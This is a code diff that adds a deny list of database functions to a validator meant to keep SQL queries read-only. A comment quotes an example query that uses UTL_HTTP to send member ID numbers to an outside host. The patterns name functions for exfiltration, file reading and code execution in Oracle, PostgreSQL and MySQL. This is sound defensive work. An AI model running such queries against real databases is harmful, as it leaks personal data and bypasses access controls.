@@ -268,6 +268,36 @@ export const OPERACIONES_QUE_ESCRIBEN = new Set([
 ]);
 
 /**
+ * Lo que sale de la base, o ejecuta codigo, desde dentro de un SELECT.
+ *
+ * Nada de esto escribe en una tabla, asi que la puerta —que miraba si la sentencia
+ * escribe— los dejaba pasar. Pero:
+ *
+ *   SELECT UTL_HTTP.REQUEST('http://fuera/' || cedula) FROM socios
+ *
+ * no escribe nada: se lleva los datos. Y `DBMS_SQL` y `DBMS_XMLGEN` ejecutan SQL armado
+ * en tiempo de ejecucion, o sea que meten por la ventana lo que la puerta no deja pasar.
+ *
+ * Van los tres motores juntos porque la regla es la misma y el articulo no sabe contra
+ * cual se va a ejecutar. Se bloquean por nombre, que es una defensa imperfecta: lo que
+ * no este en la lista pasa. Por eso la lista cubre salir de la base y ejecutar codigo —
+ * no lo que simplemente es raro.
+ */
+const FUERA_DE_LA_CONSULTA = [
+  // Oracle: red, ficheros, y ejecucion de SQL o de trabajos
+  [/\butl_(http|tcp|smtp|inaddr|file|mail|url)\b/i, 'sale de la base'],
+  [/\bhttpuritype\b/i, 'hace una peticion HTTP'],
+  [/\bdbms_(sql|xmlgen|scheduler|job|pipe|aq|ldap|backup_restore)\b/i, 'ejecuta codigo o trabajos'],
+  // PostgreSQL: ficheros, objetos grandes y conexiones salientes
+  [/\bpg_(read_file|read_binary_file|ls_dir|stat_file|sleep)\b/i, 'lee el disco o detiene la sesion'],
+  [/\blo_(import|export)\b/i, 'lee o escribe ficheros'],
+  [/\bdblink(_exec)?\s*\(/i, 'abre una conexion a otra base'],
+  // MySQL: ficheros
+  [/\bload_file\s*\(/i, 'lee el disco'],
+  [/\bsys_(exec|eval)\s*\(/i, 'ejecuta ordenes del sistema'],
+];
+
+/**
  * Lo que una consulta no puede llevar aunque empiece por SELECT.
  *
  * Las tres escriben o bloquean, y las tres se leen como 'select':
@@ -346,6 +376,15 @@ export function asegurarSoloConsulta(sqlText) {
         throw new Error(
           `Esa consulta lleva ${descripcion}, y eso no es consultar. `
           + 'Escriba un SELECT con los campos que haya que pedir.'
+        );
+      }
+    }
+    for (const [patron, descripcion] of FUERA_DE_LA_CONSULTA) {
+      const encontrado = sinLiterales.match(patron);
+      if (encontrado) {
+        throw new Error(
+          `Esa consulta usa ${encontrado[0].toUpperCase()}, que ${descripcion}. `
+          + 'Un articulo lee de la base y nada mas.'
         );
       }
     }
